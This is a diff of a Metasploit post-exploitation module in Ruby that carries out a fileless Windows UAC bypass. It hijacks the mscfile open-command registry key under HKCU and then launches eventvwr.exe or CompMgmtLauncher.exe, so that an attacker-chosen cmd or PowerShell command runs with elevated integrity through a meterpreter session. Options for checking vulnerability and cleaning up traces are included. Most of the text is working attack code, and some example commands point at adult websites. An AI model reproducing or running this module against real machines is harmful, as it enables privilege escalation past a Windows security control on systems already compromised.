@@ -28,23 +28,18 @@
 # has been achieved in a high integrity process (bypassing UAC) without dropping a DLL or other file down to
 # the file system. This significantly reduces the risk to the attacker because they aren’t placing a traditional
 # file on the file system that can be caught by AV/HIPS or forensically identified later.
-# "This module differs from 'OJ msf module' because it uses cmd.exe insted of powershell.exe"
+# "This module differs from 'OJ msf module' because it uses cmd.exe OR powershell.exe"
 # "This module will not work if target UAC level its set to 'Always Notify'"
 #
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on     => set SESSION 3
-# The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
-# Check target vulnerability settings/status?  => set CHECK_VULN true
-# Delete malicious registry hive keys/values?  => set DEL_REGKEY true
-# Use powershell.exe to execute our command?   => set USE_POWERSHELL true
-# The binary.exe vulnerable?                   => set VULN_SOFT CompMgmtLauncher.exe
-# ---
-# HINT: To execute a powershell command we need the follow settings active:
-# EXAMPLE: set USE_POWERSHELL true
-# EXAMPLE: set EXEC_COMMAND start chrome.exe www.youporn.com
-# ---
+# The session number to run this module on       => set SESSION 3
+# The command to be executed (cmd or powershell) => set EXEC_COMMAND start firefox.exe www.househot.com
+# Check target vulnerability status/details?     => set CHECK_VULN true
+# Delete malicious registry hive/keys?           => set DEL_REGKEY true
+# Use powershell.exe to execute our command?     => set USE_POWERSHELL true
+# The binary/service vulnerable to be hijack     => set VULN_SOFT CompMgmtLauncher.exe
 #
 #
 #
@@ -67,11 +62,9 @@
 # [ HINT ]
 # In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
-# 1 - /etc/init.d/postgresql start
-# 2 - msfdb delete (optional)
-# 3 - msfdb init   (optional)
-# 4 - msfconsole
-# 5 - reload_all
+# 1 - service postgresql start
+# 2 - msfdb reinit (optional)
+# 3 - msfconsole -x 'reload_all'
 ##
 
 
@@ -108,28 +101,28 @@ class MetasploitModule < Msf::Post
 # -----------------------------------------
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'enigma fileless uac bypass [RCE]',
+                        'Name'          => 'enigma fileless uac bypass [registry hijacking]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe OR powershell.exe to execute command. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover: enigma0x3 | mattifestation',  # credits
+                                        'Vuln discover: enigma0x3 | mattifestation',  # vulnerability credits
                                 ],
  
-                        'Version'        => '$Revision: 2.0',
+                        'Version'        => '$Revision: 2.1',
                         'DisclosureDate' => 'mar 16 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'false', # thats no need for privilege escalation..
+                        'Privileged'     => 'false',   # thats no need for privilege escalation..
                         'Targets'        =>
                                 [
-                                         # Tested againts windows 7 | Windows 8 | Windows 10
-                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
+                                         # Tested againts windows 7 | Windows 10
+                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                 ],
-                        'DefaultTarget'  => '6', # default its to run againts windows 10
+                        'DefaultTarget'  => '5', # default its to run againts windows 10
                         'References'     =>
                                 [
                                          [ 'URL', 'POC: goo.gl/XHQ6aF' ],
@@ -141,7 +134,7 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1',             # Default its to run againts session 1
+                                         'SESSION' => '1',              # Default its to run againts session 1
                                          'VULN_SOFT' => 'eventvwr.exe', # Default its to run againts eventvwr.exe
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
@@ -151,15 +144,15 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('EXEC_COMMAND', [ false, 'The cmd command to be executed (eg start notepad.exe)']),
-                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false])
+                                OptString.new('EXEC_COMMAND', [ false, 'The command to be executed (eg start notepad.exe)']),
+                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status/details?' , false])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptString.new('VULN_SOFT', [ false, 'The binary.exe vulnerable (eg CompMgmtLauncher.exe)']),
-                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe to execute our command?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
+                                OptString.new('VULN_SOFT', [ false, 'The binary/service vulnerable (eg CompMgmtLauncher.exe)']),
+                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe -Command to execute our command?' , false]),
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys?' , false])
                         ], self.class) 
 
         end
@@ -184,7 +177,7 @@ end
 
   r=''
   vul_serve = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
-  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
+  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
@@ -201,7 +194,7 @@ end
     Rex::sleep(1.5)
   end
 
-    # search in target regedit if eventvwr calls mmc.exe
+    # search in target regedit if binary calls mmc.exe
     print_warning("Reading process registry hive keys...")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
@@ -242,29 +235,31 @@ end
       end
 
         #
-        # chose to execute a single command in cmd.exe syntax logic
-        # or to execute a shellcode(base64) string using powershell.exe
+        # chose to execute a single command in cmd.exe interpreter
+        # or to execute a command using powershell.exe interpreter
         #
         if datastore['USE_POWERSHELL'] == true
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-          print_good(" exec => Injecting shellcode(base64) string (powershell.exe)")
+          print_good(" exec => Creating registry powershell command data")
+          print_good("   data: #{psh_comma} #{exec_comm}")
           Rex::sleep(1.0)
         else
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
-          print_good(" exec => Injecting cmd command string (cmd.exe)")
+          print_good(" exec => Creating registry cmd command data")
+          print_good("   data: #{comm_path} #{exec_comm}")
           Rex::sleep(1.0)
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -Command start chrome.exe www.youporn.com" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -Command start notepad.exe" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
- print_good(" exec => Hijacking process to gain code execution...")
+ print_good(" exec => Hijacking process to gain code execution ..")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
- Rex::sleep(4.5)
+ Rex::sleep(4.0)
 
       # start remote service to gain code execution
-      print_good(" exec => Starting #{vul_serve} native process...")
+      print_good(" exec => Starting #{vul_serve} native process ..")
       r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
@@ -293,7 +288,7 @@ def ls_stage2
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['DEL_REGKEY'] == 'nil'
-    print_error("Options not configurated correctly...")
+    print_error("Options not configurated correctly ..")
     print_warning("Please set DEL_REGKEY option!")
     return nil
   else
@@ -302,7 +297,7 @@ def ls_stage2
   end
 
     # search in target regedit if hijacking method allready exists
-    print_warning("Reading process registry hive keys...")
+    print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
       print_good(" exec => Remote registry hive key found!")
@@ -310,16 +305,17 @@ def ls_stage2
     else
        # registry hive key not found, aborting module execution.
        print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-       print_error("[ABORT]: module cant find the registry hive key needed...")
+       print_error("[ABORT]: module cant find the registry hive key needed ..")
        print_error("System does not appear to be vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
     end
 
- # Delete hijacking hive keys from target regedit...
+ # Delete hijacking hive/keys from target regedit...
  # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
- print_good(" exec => Deleting HKCU hive registry keys...")
+ print_good(" exec => Deleting HKCU hive registry keys ..")
+ print_good(" exec => cmd.exe /c #{reg_clean}")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
@@ -370,7 +366,7 @@ def ls_stage3
     Rex::sleep(1.5)
   end
 
-    print_warning("Reading process registry hive keys...")
+    print_warning("Reading process registry hive keys ..")
     Rex::sleep(2.0)
     # check target registry hive/key settings (mmc.exe call)
     if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
@@ -420,7 +416,6 @@ def ls_stage3
     print_line("    KEY_INFO    : #{report_tw}")
     print_line("")
     print_line("")
-    Rex::sleep(1.0)
 
   # building better reports outputs
   if report_on == "EXPLOITABLE"
@@ -436,7 +431,6 @@ def ls_stage3
     print_line("           : execution to run injected string in target machine...")
   end
 
-Rex::sleep(1.0)
 print_line("")
 end
 
